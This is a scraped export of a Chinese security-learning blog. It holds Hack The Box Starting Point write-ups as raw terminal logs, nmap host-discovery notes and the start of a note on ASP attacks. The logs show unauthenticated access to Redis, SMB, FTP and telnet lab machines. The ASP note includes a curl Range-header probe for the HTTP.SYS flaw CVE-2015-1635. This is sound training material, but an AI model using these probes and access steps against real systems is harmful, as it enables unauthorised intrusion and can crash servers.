installed: libatomic1 libjemalloc2 liblua5.1-0 liblzf1 lua-bitop lua-cjsonSuggested packages: ruby-redisThe following NEW packages will be installed: libatomic1 libjemalloc2 liblua5.1-0 liblzf1 lua-bitop lua-cjson redis-tools0 upgraded, 7 newly installed, 0 to remove and 24 not upgraded.Need to get 1237 kB of archives.After this operation, 5576 kB of additional disk space will be used.Do you want to continue? [Y/n] yGet:1 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy-updates/main amd64 libatomic1 amd64 12.1.0-2ubuntu1~22.04 [10.4 kB]Get:2 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 libjemalloc2 amd64 5.2.1-4ubuntu1 [240 kB]Get:3 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 liblua5.1-0 amd64 5.1.5-8.1build4 [99.9 kB]Get:4 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 liblzf1 amd64 3.6-3 [7444 B]Get:5 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 lua-bitop amd64 1.0.2-5 [6680 B]Get:6 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 lua-cjson amd64 2.1.0+dfsg-2.1 [17.4 kB]Get:7 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 redis-tools amd64 5:6.0.16-1ubuntu1 [856 kB]Fetched 1237 kB in 0s (2631 kB/s)debconf: DbDriver &quot;config&quot;: /var/cache/debconf/config.dat is locked by another process: Resource temporarily unavailableSelecting previously unselected package libatomic1:amd64.(Reading database ... 94767 files and directories currently installed.)Preparing to unpack .../0-libatomic1_12.1.0-2ubuntu1~22.04_amd64.deb ...Unpacking libatomic1:amd64 (12.1.0-2ubuntu1~22.04) ...Selecting previously unselected package libjemalloc2:amd64.Preparing to unpack .../1-libjemalloc2_5.2.1-4ubuntu1_amd64.deb ...Unpacking libjemalloc2:amd64 (5.2.1-4ubuntu1) ...Selecting previously unselected package liblua5.1-0:amd64.Preparing to unpack .../2-liblua5.1-0_5.1.5-8.1build4_amd64.deb ...Unpacking liblua5.1-0:amd64 (5.1.5-8.1build4) ...Selecting previously unselected package liblzf1:amd64.Preparing to unpack .../3-liblzf1_3.6-3_amd64.deb ...Unpacking liblzf1:amd64 (3.6-3) ...Selecting previously unselected package lua-bitop:amd64.Preparing to unpack .../4-lua-bitop_1.0.2-5_amd64.deb ...Unpacking lua-bitop:amd64 (1.0.2-5) ...Selecting previously unselected package lua-cjson:amd64.Preparing to unpack .../5-lua-cjson_2.1.0+dfsg-2.1_amd64.deb ...Unpacking lua-cjson:amd64 (2.1.0+dfsg-2.1) ...Selecting previously unselected package redis-tools.Preparing to unpack .../6-redis-tools_5%3a6.0.16-1ubuntu1_amd64.deb ...Unpacking redis-tools (5:6.0.16-1ubuntu1) ...Setting up libjemalloc2:amd64 (5.2.1-4ubuntu1) ...Setting up lua-cjson:amd64 (2.1.0+dfsg-2.1) ...Setting up liblzf1:amd64 (3.6-3) ...Setting up libatomic1:amd64 (12.1.0-2ubuntu1~22.04) ...Setting up lua-bitop:amd64 (1.0.2-5) ...Setting up liblua5.1-0:amd64 (5.1.5-8.1build4) ...Setting up redis-tools (5:6.0.16-1ubuntu1) ...Processing triggers for man-db (2.10.2-1) ...Processing triggers for libc-bin (2.35-0ubuntu3.1) ...debconf: DbDriver &quot;config&quot;: /var/cache/debconf/config.dat is locked by another process: Resource temporarily unavailableubuntu@ip:~$ redis-cli --helpredis-cli 6.0.16Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]] -h &lt;hostname&gt; Server hostname (default: 127.0.0.1). -p &lt;port&gt; Server port (default: 6379). -s &lt;socket&gt; Server socket (overrides hostname and port). -a &lt;password&gt; Password to use when connecting to the server. You can also use the REDISCLI_AUTH environment variable to pass this password more safely (if both are used, this argument takes precedence). --user &lt;username&gt; Used to send ACL style &#x27;AUTH username pass&#x27;. Needs -a. --pass &lt;password&gt; Alias of -a for consistency with the new --user option. --askpass Force user to input password with mask from STDIN. If this argument is used, &#x27;-a&#x27; and REDISCLI_AUTH environment variable will be ignored. -u &lt;uri&gt; Server URI. -r &lt;repeat&gt; Execute specified command N times. -i &lt;interval&gt; When -r is used, waits &lt;interval&gt; seconds per command. It is possible to specify sub-second times like -i 0.1. -n &lt;db&gt; Database number. -3 Start session in RESP3 protocol mode. -x Read last argument from STDIN. -d &lt;delimiter&gt; Delimiter between response bulks for raw formatting (default: ). -D &lt;delimiter&gt; Delimiter between responses for raw formatting (default: ). -c Enable cluster mode (follow -ASK and -MOVED redirections). --tls Establish a secure TLS connection. --sni &lt;host&gt; Server name indication for TLS. --cacert &lt;file&gt; CA Certificate file to verify with. --cacertdir &lt;dir&gt; Directory where trusted CA certificates are stored. If neither cacert nor cacertdir are specified, the default system-wide trusted root certs configuration will apply. --cert &lt;file&gt; Client certificate to authenticate with. --key &lt;file&gt; Private key file to authenticate with. --raw Use raw formatting for replies (default when STDOUT is not a tty). --no-raw Force formatted output even when STDOUT is not a tty. --csv Output in CSV format. --stat Print rolling stats about server: mem, clients, ... --latency Enter a special mode continuously sampling latency. If you use this mode in an interactive session it runs forever displaying real-time stats. Otherwise if --raw or --csv is specified, or if you redirect the output to a non TTY, it samples the latency for 1 second (you can use -i to change the interval), then produces a single output and exits. --latency-history Like --latency but tracking latency changes over time. Default time interval is 15 sec. Change it using -i. --latency-dist Shows latency as a spectrum, requires xterm 256 colors. Default time interval is 1 sec. Change it using -i. --lru-test &lt;keys&gt; Simulate a cache workload with an 80-20 distribution. --replica Simulate a replica showing commands received from the master. --rdb &lt;filename&gt; Transfer an RDB dump from remote server to local file. --pipe Transfer raw Redis protocol from stdin to server. --pipe-timeout &lt;n&gt; In --pipe mode, abort with error if after sending all data. no reply is received within &lt;n&gt; seconds. Default timeout: 30. Use 0 to wait forever. --bigkeys Sample Redis keys looking for keys with many elements (complexity). --memkeys Sample Redis keys looking for keys consuming a lot of memory. --memkeys-samples &lt;n&gt; Sample Redis keys looking for keys consuming a lot of memory. And define number of key elements to sample --hotkeys Sample Redis keys looking for hot keys. only works when maxmemory-policy is *lfu. --scan List all keys using the SCAN command. --pattern &lt;pat&gt; Keys pattern when using the --scan, --bigkeys or --hotkeys options (default: *). --intrinsic-latency &lt;sec&gt; Run a test to measure intrinsic system latency. The test will run for the specified amount of seconds. --eval &lt;file&gt; Send an EVAL command using the Lua script at &lt;file&gt;. --ldb Used with --eval enable the Redis Lua debugger. --ldb-sync-mode Like --ldb but uses the synchronous Lua debugger, in this mode the server is blocked and script changes are not rolled back from the server memory. --cluster &lt;command&gt; [args...] [opts...] Cluster Manager command and arguments (see below). --verbose Verbose mode. --no-auth-warning Don&#x27;t show warning message when using password on command line interface. --help Output this help and exit. --version Output version and exit.Cluster Manager Commands: Use --cluster help to list all available cluster manager commands.Examples: cat /etc/passwd | redis-cli -x set mypasswd redis-cli get mypasswd redis-cli -r 100 lpush mylist x redis-cli -r 100 -i 1 info | grep used_memory_human: redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3 redis-cli --scan --pattern &#x27;*:12345*&#x27; (Note: when using --eval the comma separates KEYS[] from ARGV[] items)When no command is given, redis-cli starts in interactive mode.Type &quot;help&quot; in interactive mode for information on available commandsand settings.ubuntu@ip:~$ redis-cli -h 10.129.68.3010.129.68.30:6379&gt; info# Serverredis_version:5.0.7redis_git_sha1:00000000redis_git_dirty:0redis_build_id:66bd629f924ac924redis_mode:standaloneos:Linux 5.4.0-77-generic x86_64arch_bits:64multiplexing_api:epollatomicvar_api:atomic-builtingcc_version:9.3.0process_id:750run_id:d3dd8b76d2419d950a3274b7385776b2e4c4c80dtcp_port:6379uptime_in_seconds:3019uptime_in_days:0hz:10configured_hz:10lru_clock:10499320executable:/usr/bin/redis-serverconfig_file:/etc/redis/redis.conf# Clientsconnected_clients:1client_recent_max_input_buffer:2client_recent_max_output_buffer:0blocked_clients:0# Memoryused_memory:859624used_memory_human:839.48Kused_memory_rss:6004736used_memory_rss_human:5.73Mused_memory_peak:859624used_memory_peak_human:839.48Kused_memory_peak_perc:100.00%used_memory_overhead:846142used_memory_startup:796224used_memory_dataset:13482used_memory_dataset_perc:21.26%allocator_allocated:1564792allocator_active:1937408allocator_resident:9158656total_system_memory:2084024320total_system_memory_human:1.94Gused_memory_lua:41984used_memory_lua_human:41.00Kused_memory_scripts:0used_memory_scripts_human:0Bnumber_of_cached_scripts:0maxmemory:0maxmemory_human:0Bmaxmemory_policy:noevictionallocator_frag_ratio:1.24allocator_frag_bytes:372616allocator_rss_ratio:4.73allocator_rss_bytes:7221248rss_overhead_ratio:0.66rss_overhead_bytes:-3153920mem_fragmentation_ratio:7.34mem_fragmentation_bytes:5187120mem_not_counted_for_evict:0mem_replication_backlog:0mem_clients_slaves:0mem_clients_normal:49694mem_aof_buffer:0mem_allocator:jemalloc-5.2.1active_defrag_running:0lazyfree_pending_objects:0# Persistenceloading:0rdb_changes_since_last_save:0rdb_bgsave_in_progress:0rdb_last_save_time:1688218802rdb_last_bgsave_status:okrdb_last_bgsave_time_sec:0rdb_current_bgsave_time_sec:-1rdb_last_cow_size:409600aof_enabled:0aof_rewrite_in_progress:0aof_rewrite_scheduled:0aof_last_rewrite_time_sec:-1aof_current_rewrite_time_sec:-1aof_last_bgrewrite_status:okaof_last_write_status:okaof_last_cow_size:0# Statstotal_connections_received:7total_commands_processed:6instantaneous_ops_per_sec:0total_net_input_bytes:293total_net_output_bytes:14786instantaneous_input_kbps:0.00instantaneous_output_kbps:0.00rejected_connections:0sync_full:0sync_partial_ok:0sync_partial_err:0expired_keys:0expired_stale_perc:0.00expired_time_cap_reached_count:0evicted_keys:0keyspace_hits:0keyspace_misses:0pubsub_channels:0pubsub_patterns:0latest_fork_usec:693migrate_cached_sockets:0slave_expires_tracked_keys:0active_defrag_hits:0active_defrag_misses:0active_defrag_key_hits:0active_defrag_key_misses:0# Replicationrole:masterconnected_slaves:0master_replid:f95485220a58f8f0162a074f22fd55906dfdd0femaster_replid2:0000000000000000000000000000000000000000master_repl_offset:0second_repl_offset:-1repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0# CPUused_cpu_sys:2.878009used_cpu_user:3.157382used_cpu_sys_children:0.002176used_cpu_user_children:0.000000# Clustercluster_enabled:0# Keyspacedb0:keys=4,expires=0,avg_ttl=010.129.68.30:6379&gt; select 0OK10.129.68.30:6379&gt; key *(error) ERR unknown command `key`, with args beginning with: `*`, 10.129.68.30:6379&gt; keys *1) &quot;temp&quot;2) &quot;numb&quot;3) &quot;flag&quot;4) &quot;stor&quot;10.129.68.30:6379&gt; get temp&quot;1c98492cd337252698d0c5f631dfb7ae&quot;10.129.68.30:6379&gt; get flag&quot;03e1d2b376c37ab3f5319922053953eb&quot; 做不动英语阅读了……….","tags":["HTB","笔记","STARTING POINT"],"categories":["Range","HTB"]},{"title":"HTB-Dancing","path":"/2023/07/03/HTB/HTB-Dancing/","content":"SMB &#x3D; Server Message Block 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101ubuntu@ip:~$ nmap -sV 10.129.166.135Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 10:00 UTCNmap scan report for ip-10-129-166-135.us-west-1.compute.internal (10.129.166.135)Host is up (0.076s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.26 secondsubuntu@ip:~$ smbclient -L 10.129.166.135Password for [WORKGROUP\\ubuntu]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC WorkShares Disk SMB1 disabled -- no workgroup availableubuntu@ip:~$ smbclient \\\\\\\\10.129.166.135\\\\WorkSharesPassword for [WORKGROUP\\ubuntu]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; help? allinfo altname archive backup blocksize cancel case_sensitive cd chmod chown close del deltree dir du echo exit get getfacl geteas hardlink help history iosize lcd link lock lowercase ls l mask md mget mkdir more mput newer notify open posix posix_encrypt posix_open posix_mkdir posix_rmdir posix_unlink posix_whoami print prompt put pwd q queue quit readlink rd recurse reget rename reput rm rmdir showacls setea setmode scopy stat symlink tar tarmode timeout translate unlock volume vuid wdel logon listconnect showconnect tcon tdis tid utimes logoff .. ! smb: \\&gt; ls . D 0 Mon Mar 29 08:22:01 2021 .. D 0 Mon Mar 29 08:22:01 2021 Amy.J D 0 Mon Mar 29 09:08:24 2021 James.P D 0 Thu Jun 3 08:38:03 2021 5114111 blocks of size 4096. 1752067 blocks availablesmb: \\&gt; cd Amy.J\\smb: \\Amy.J\\&gt; ls . D 0 Mon Mar 29 09:08:24 2021 .. D 0 Mon Mar 29 09:08:24 2021 worknotes.txt A 94 Fri Mar 26 11:00:37 2021 5114111 blocks of size 4096. 1752067 blocks availablesmb: \\Amy.J\\&gt; get worknotes.txt getting file \\Amy.J\\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)smb: \\Amy.J\\&gt; cd ..smb: \\&gt; ls . D 0 Mon Mar 29 08:22:01 2021 .. D 0 Mon Mar 29 08:22:01 2021 Amy.J D 0 Mon Mar 29 09:08:24 2021 James.P D 0 Thu Jun 3 08:38:03 2021 5114111 blocks of size 4096. 1752067 blocks availablesmb: \\&gt; cd James.P\\smb: \\James.P\\&gt; ls . D 0 Thu Jun 3 08:38:03 2021 .. D 0 Thu Jun 3 08:38:03 2021 flag.txt A 32 Mon Mar 29 09:26:57 2021 5114111 blocks of size 4096. 1752051 blocks availablesmb: \\James.P\\&gt; get flag.txt getting file \\James.P\\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)smb: \\James.P\\&gt; exitubuntu@ip:~$ lsflag.txt lab_KILLMEN.ovpn lab_KILLMEN1.ovpn snap starting_point_KILLMEN.ovpn worknotes.txtubuntu@ip:~$ cat worknotes.txt - start apache server on the linux machine- secure the ftp server- setup winrm on dancing ubuntu@ip-172-31-17-119:~$ ubuntu@ip:~$ cat flag.txt 5f61c10dffbc77a704d76016a22f1664 One of these 其中一个；其中之一 serial ports 串行端口 reserved for 保留给 authentication n. 认证；鉴定；身份验证 Hypothetically 假设；假设地；假定地；假想 alongside prep. 与…一起；在…旁边；与…同时；沿着 adv. 在…旁边；与…并排；在…的侧面 tactic n. 战术；策略；手段；兵法；招数 adj. 排列的，顺序的；&lt;化&gt;有规立构的；&lt;生&gt;（有）趋性的 prone adj. 俯卧的；易于遭受…的；易于遭受；有做…倾向的；有做(坏事)的倾向 directories n. (计算机文件或程序的)目录；名录；电话号码簿；公司名录","tags":["HTB","笔记","STARTING POINT"],"categories":["Range","HTB"]},{"title":"HTB-Fawn","path":"/2023/07/03/HTB/HTB-Fawn/","content":"FTP &#x3D; File Transfer Protocol &gt; 21 port 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107ubuntu@ip:~$ ping 10.129.24.17PING 10.129.24.17 (10.129.24.17) 56(84) bytes of data.64 bytes from 10.129.24.17: icmp_seq=1 ttl=63 time=75.7 ms64 bytes from 10.129.24.17: icmp_seq=2 ttl=63 time=75.7 ms64 bytes from 10.129.24.17: icmp_seq=3 ttl=63 time=75.6 ms64 bytes from 10.129.24.17: icmp_seq=4 ttl=63 time=75.7 ms^C--- 10.129.24.17 ping statistics ---16 packets transmitted, 16 received, 0% packet loss, time 15025msrtt min/avg/max/mdev = 75.492/75.685/75.995/0.129 msubuntu@ip-172-31-17-119:~$ sudo nmap 10.129.24.17Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 06:16 UTCCouldn`t open a raw socket. Error: Permission denied (13)ubuntu@ip:~$ nmap 10.129.24.17Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 06:17 UTCNmap scan report for ip-10-129-24-17.us-west-1.compute.internal (10.129.24.17)Host is up (0.076s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE21/tcp open ftpNmap done: 1 IP address (1 host up) scanned in 1.32 secondsubuntu@ip:~$ nmap -sV 10.129.24.17Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 06:24 UTCNmap scan report for ip-10-129-24-17.us-west-1.compute.internal (10.129.24.17)Host is up (0.075s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3Service Info: OS: UnixService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1.87 secondsubuntu@ip:~$ apt install ftp -yE: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?ubuntu@ip-172-31-17-119:~$ ftp --hftp: invalid option -- &#x27;-&#x27;usage: ftp [-46AadefginpRtVv] [-N NETRC] [-o OUTPUT] [-P PORT] [-q QUITTIME] [-r RETRY] [-s SRCADDR] [-T DIR,MAX[,INC]] [-x XFERSIZE] [[USER@]HOST [PORT]] [[USER@]HOST:[PATH][/]] [file:///PATH] [ftp://[USER[:PASSWORD]@]HOST[:PORT]/PATH[/][;type=TYPE]] [http://[USER[:PASSWORD]@]HOST[:PORT]/PATH] [https://[USER[:PASSWORD]@]HOST[:PORT]/PATH] ... ftp -u URL FILE ... ftp -?ubuntu@ip:~$ ftp 10.129.24.17Connected to 10.129.24.17.220 (vsFTPd 3.0.3)Name (10.129.24.17:ubuntu): anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; helpCommands may be abbreviated. Commands are:! edit lpage nlist rcvbuf struct$ epsv lpwd nmap recv suniqueaccount epsv4 ls ntrans reget systemappend epsv6 macdef open remopts tenexascii exit mdelete page rename throttlebell features mdir passive reset tracebinary fget mget pdir restart typebye form mkdir pls rhelp umaskcase ftp mls pmlsd rmdir unsetcd gate mlsd preserve rstatus usagecdup get mlst progress runique userchmod glob mode prompt send verboseclose hash modtime proxy sendport xferbufcr help more put set ?debug idle mput pwd sitedelete image mreget quit sizedir lcd msend quote sndbufdisconnect less newer rate statusftp&gt; ls229 Entering Extended Passive Mode (|||62732|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt226 Directory send OK.ftp&gt; get flag.txtlocal: flag.txt remote: flag.txt229 Entering Extended Passive Mode (|||56926|)150 Opening BINARY mode data connection for flag.txt (32 bytes).100% |***************************************************************| 32 119.73 KiB/s 00:00 ETA226 Transfer complete.32 bytes received in 00:00 (0.41 KiB/s)ftp&gt; bye421 Timeout.ubuntu@ip-172-31-17-119:~$ lsflag.txt lab_KILLMEN.ovpn lab_KILLMEN1.ovpn snap starting_point_KILLMEN.ovpnubuntu@ip-172-31-17-119:~$ cat flag.txt 035db21c881520061c53e0536e44f815ubuntu 单词 释义 acronym n. 缩略语；首字母缩略词(如Aids系由acquired immune deficiency syndrome的首字母组成) explore v. 探讨；探索；勘探；探究；勘查；考察；(用手或身体某部)探察，探查；调查研究 configuration n. (计算机的)配置；结构；构造；形状；布局；格局 rudimentary adj. 基本的；初级的；基础的；原始的；未充分发展的 potentially adv. 潜在地 low-overhead 低开销 invoked v. 援引，援用(法律、规则等作为行动理由)；提及，援引(某人、某理论、实例等作为支持)；提出(某人的名字，以激发某种感觉或行动) invoke的过去分词和过去式 otherwise adv. 否则；另；不然；在其他方面；亦；除此以外 conj. 否则 adj. 别的；在其他各方面…的；在其他不同情况下的 infinitely adv. 非常；无限地；极其 previously adv. 先前；(一段时间)以前 properly adv. 适当地；正确地；恰当地；实际上；真正地；得体地；符合习俗地","tags":["HTB","笔记","STARTING POINT"],"categories":["Range","HTB"]},{"title":"HTB-Meow","path":"/2023/06/30/HTB/HTB-Meow/","content":"环境：使用AWS Ubuntu22.04服务器加州IP连接VPN（免费白嫖一年） 首次登录记得获取root权限，要不然连接openvpn一直错误 12sudo passwd rootsu root 只是看了攻略，连接这块提到ssh隧道转发，但是最后发现其实并不需要很复杂的隧道转发 不过怎么样还是学了一些关于ssh转发的知识 Xshell隧道转发：https://blog.csdn.net/weixin_38491225/article/details/125923278 至于连接实验环境： 使用root连接VPN，下载文件openvpn打开 &gt; 连接后可继续做题 使用user扫描靶机IP拿到flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970ubuntu@ip:~$ nmap -sV 10.129.237.214Command &#x27;nmap&#x27; not found, but can be installed with:sudo snap install nmap # version 7.93, orsudo apt install nmap # version 7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1See &#x27;snap info nmap&#x27; for additional versions.ubuntu@ip:~$ sudo snap install nmapnmap 7.93 from Maximiliano Bertacchini (maxiberta) installedubuntu@ip:~$ nmap -sV 10.129.237.214Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 17:17 UTCNote: Host seems down. If it is really up, but blocking our ping probes, try -PnNmap done: 1 IP address (0 hosts up) scanned in 3.34 secondsubuntu@ip:~$ nmap -sV 10.129.237.214Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 17:20 UTCNmap scan report for ip-10-129-237-214.us-west-1.compute.internal (10.129.237.214)Host is up (0.078s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION23/tcp open telnet Linux telnetdService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.80 secondsubuntu@ip:~$ telnet 10.129.237.214Trying 10.129.237.214...Connected to 10.129.237.214.Escape character is &#x27;^]&#x27;. █ █ ▐▌ ▄█▄ █ ▄▄▄▄ █▄▄█ ▀▀█ █▀▀ ▐▌▄▀ █ █▀█ █▀█ █▌▄█ ▄▀▀▄ ▀▄▀ █ █ █▄█ █▄▄ ▐█▀▄ █ █ █ █▄▄ █▌▄█ ▀▄▄▀ █▀█Meow login: rootWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri 30 Jun 2023 05:28:39 PM UTC System load: 0.0 Usage of /: 41.7% of 7.75GB Memory usage: 4% Swap usage: 0% Processes: 138 Users logged in: 0 IPv4 address for eth0: 10.129.237.214 IPv6 address for eth0: dead:beef::250:56ff:feb9:bd2975 updates can be applied immediately.31 of these updates are standard security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Mon Sep 6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0root@Meow:~# lsflag.txt snaproot@Meow:~# root@Meow:~# cat flag.txt b40abdfe23665f766f9c61ecba8a4c19root@Meow:~# 最终第一关过了，因为是最简单的关卡，题倒没什么难的，仿佛在做英语阅读…..","tags":["HTB","笔记","STARTING POINT"],"categories":["Range","HTB"]},{"title":"主机发现","path":"/2023/06/29/HTB/NMAP工具使用-主机枚举/主机发现/","content":"主机发现发现主机 Host Discovery最有效的主机发现方法是使用ICMP echo requests 1234567KillMen1@htb[/htb]$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d&quot; &quot; -f510.129.2.410.129.2.1010.129.2.1110.129.2.1810.129.2.1910.129.2.2010.129.2.28 此扫描方法仅在主机防火墙允许的情况下才有效。否则，我们可以使用其他扫描技术来查明主机是否处于活动状态。我们将在Firewall and IDS Evasion中仔细研究这些技术。 扫描IP列表 Scan IP ListNmap为我们提供了使用列表并从此列表中读取主机的选项，而不是手动定义或键入它们（内部渗透直接给了我们主机目标IP List）。 1234567KillMen1@htb[/htb]$ cat hosts.lst10.129.2.410.129.2.1010.129.2.1110.129.2.1810.129.2.1910.129.2.2010.129.2.28 可以把扫描IP和发现主机写进同一行命令中： 123KillMen1@htb[/htb]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d&quot; &quot; -f510.129.2.1810.129.2.1910.129.2.20 在此示例中，我们看到 7 个主机中只有 3 个处于活动状态。请记住，这可能意味着其他主机由于其防火墙配置而忽略默认的ICMP 回显请求。由于Nmap没有收到响应，它将这些主机标记为不活动。 扫描多个IP123KillMen1@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d&quot; &quot; -f510.129.2.1810.129.2.1910.129.2.20 扫描单个IP在扫描单个主机的开放端口及其服务之前，我们首先必须确定它是否处于活动状态。为此，我们可以使用与之前相同的方法。 12345KillMen1@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA hostStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 23:59 CESTNmap scan report for 10.129.2.18Host is up (0.087s latency).MAC Address: DE:AD:00:00:BE:EFNmap done: 1 IP address (1 host up) scanned in 0.11 seconds 如果我们禁用端口扫描（-sn），Nmap会使用ICMP回显请求（-PE）自动ping扫描。一旦发送了这样的请求，如果ping主机处于活动状态，我们通常会收到ICMP回复。更有趣的事实是，我们之前的扫描并没有做到这一点，因为在Nmap发送ICMP回显请求之前，它会发送ARP ping，从而得到ARP回复。我们可以通过“--packet trace”选项来确认这一点。为了确保发送ICMP回显请求，我们还为此定义了选项（-PE）。 1234567KillMen1@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CESTSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EFNmap scan report for 10.129.2.18Host is up (0.023s latency).MAC Address: DE:AD:00:00:BE:EFNmap done: 1 IP address (1 host up) scanned in 0.05 seconds 确定 Nmap 为什么将我们的目标标记为“alive”的另一种方法是使用“--reason”选项。 1234567KillMen1@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CESTSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EFNmap scan report for 10.129.2.18Host is up, received arp-response (0.028s latency).MAC Address: DE:AD:00:00:BE:EFNmap done: 1 IP address (1 host up) scanned in 0.03 seconds 我们在这里看到，Nmap确实仅通过ARP请求和ARP回复来检测主机是否存活。 要禁用 ARP 请求并使用所需的 ICMP 回显请求扫描我们的目标，我们可以通过设置“--disable-arp-ping”选项来禁用 ARP ping。 然后我们可以再次扫描目标并查看发送和接收的数据包。 1234567KillMen1@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:12 CESTSENT (0.0107s) ICMP [10.10.14.2 &gt; 10.129.2.18 Echo request (type=8/code=0) id=13607 seq=0] IP [ttl=255 id=23541 iplen=28 ]RCVD (0.0152s) ICMP [10.129.2.18 &gt; 10.10.14.2 Echo reply (type=0/code=0) id=13607 seq=0] IP [ttl=128 id=40622 iplen=28 ]Nmap scan report for 10.129.2.18Host is up (0.086s latency).MAC Address: DE:AD:00:00:BE:EFNmap done: 1 IP address (1 host up) scanned in 0.11 seconds 更多主机发现策略：https://nmap.org/book/host-discovery-strategies.html","tags":["HTB","笔记","工具","nmap","主机枚举"],"categories":["杂"]},{"title":"NMAP工具使用-主机枚举（总目录）","path":"/2023/06/29/HTB/NMAP工具使用-主机枚举（总目录）/","content":"主机枚举-总目录 扫描选项 描述 10.129.2.0&#x2F;24 目标网络范围。 -sn 禁用端口扫描。 -oA tnet 以名称“tnet”开头的所有格式存储结果。 -iL 对提供的“hosts.lst”列表中的目标执行定义的扫描。 -PE 通过使用“ICMP Echo Requests”针对目标执行 ping 扫描。 –reason 显示特定结果的原因。 主机发现","tags":["笔记","HTB学院","工具"],"categories":["杂"]},{"title":"第41天：ASP应用&HTTP.SYS&短文件&文件解析&Access注入&数据库泄漏","path":"/2023/06/27/xiaodi8/web/web攻防笔记第41天/","content":"41天：ASP应用&amp;HTTP.SYS&amp;短文件&amp;文件解析&amp;Access注入&amp;数据库泄漏ASP应用ASP几乎不存在了，老的应用还有一小部分。 大部分都是JAVA（18-今）和PHP（15-18）。 数据库泄露ASP+ACCESS(ACCESS无需连接，无账号密码，文件里有固定好的数据库路径，拿到路径就可以下载数据库文件解密)。 ACCESS后缀名.mdb 文件路径里的 # 替换成 %23 ，可从浏览器输入路径和文件名直接访问下载。 HTTP.SYS(CVE-2015-1635)漏洞描述蓝屏漏洞。HTTP.sys远程执行代码漏洞。 在HTTP协议栈（HTTP.SYS)中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。 对于此漏洞，一般都是对目标进行攻击，从而让目标主机死机。当然也可以执行任意代码。 影响版本Windows 7 Windows Server 2008 R2 Windows 8 Windows Server 2012 Windows 8.1 Windows Server 2012 R2 漏洞利用条件安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本。 检测漏洞是否存在在kali linux中输入： 1curl http://192.xxx.137.xxx -H &quot;Host: 192.xxx.137.xxx&quot; -H &quot;Range: bytes=0-18446744073709551615&quot; 